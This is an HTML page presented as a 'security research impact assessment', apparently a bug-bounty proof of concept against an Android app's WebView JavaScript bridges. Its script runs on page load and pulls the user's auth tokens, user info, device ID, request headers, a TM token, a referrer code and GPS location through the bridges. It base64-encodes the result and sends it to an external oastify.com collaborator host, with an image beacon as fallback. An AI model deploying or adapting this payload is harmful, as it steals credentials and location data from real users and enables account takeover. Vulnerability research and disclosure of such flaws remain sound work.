<!DOCTYPE html>
<html>
<head>
    <title>Security Research - Impact Assessment</title>
</head>
<body>
    <div id="status">Initializing...</div>

    <script>
        const gate = "https://367gdv1fg2qr6doc6l3npxt0vr1ipcd1.oastify.com";

        async function exfiltrate() {
            let loot = {};

            // --- PHASE 1: GoMMTInterface Extraction ---
            if (typeof GoMMTInterface !== 'undefined') {
                try {
                    loot.auth = GoMMTInterface.getUserAuth() || "empty";
                    loot.info = GoMMTInterface.getUserInfo() || "empty";
                    loot.devId = GoMMTInterface.getDeviceId() || "empty";
                    loot.headers = GoMMTInterface.getHeaders() || "empty";
                    loot.status = GoMMTInterface.getUserLoginStatus() || "unknown";
                } catch (e) { loot.err_gommt = e.message; }
            }

            // --- PHASE 2: mmt_android_bridge Extraction ---
            if (typeof mmt_android_bridge !== 'undefined') {
                try {
                    loot.tmToken = mmt_android_bridge.getTMToken() || "empty";
                    loot.refCode = mmt_android_bridge.getInAppStorage("referrerCode") || "none";

                    // Trigger Location (requires callback)
                    mmt_android_bridge.fetchLocation("handleLoc", true);
                } catch (e) { loot.err_mmt = e.message; }
            }

            // --- PHASE 3: Transmission ---
            const report = btoa(JSON.stringify(loot)); // Base64 encode the payload

            // Primary: Fetch (Modern)
            fetch(`${gate}/dump?data=${report}`).catch(() => {
                // Fallback: Image Beacon (Legacy/Strict)
                new Image().src = `${gate}/log?d=${report}`;
            });

            document.getElementById('status').innerHTML = "Assessment Complete.";
        }

        // Global callback for location tracking
        window.handleLoc = function(data) {
            new Image().src = `${gate}/gps?coord=` + encodeURIComponent(JSON.stringify(data));
        };

        // Execute with a slight delay to ensure bridge injection
        window.onload = () => { setTimeout(exfiltrate, 800); };
    </script>
</body>
</html>
